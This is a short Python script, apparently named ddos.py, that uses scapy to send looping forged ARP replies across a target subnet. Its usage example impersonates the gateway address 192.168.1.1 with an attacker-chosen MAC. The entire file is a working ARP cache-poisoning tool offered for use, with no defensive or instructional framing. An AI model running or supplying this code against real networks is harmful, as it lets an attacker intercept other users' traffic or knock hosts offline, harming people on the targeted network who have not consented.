import sys
from scapy.all import *

def arppoison(target,spoofed_ip,mac,vb):
	packet = ARP()
	packet.op = 2
	packet.hwsrc = mac
	packet.psrc = spoofed_ip
	packet.hwdst = 'ff:ff:ff:ff:ff:ff'
	packet.pdst = target
	srloop(packet, verbose=vb)

if len(sys.argv) != 5:
    print "Usage: ddos.py <network> <spoofed_ip> <mac> <verbose>\n  eg: ddos.py 192.168.1.0/24 192.168.1.1 ab:cd:ef:gh:ij:kl 0"
    sys.exit(1)


arppoison(sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4]))
	
			

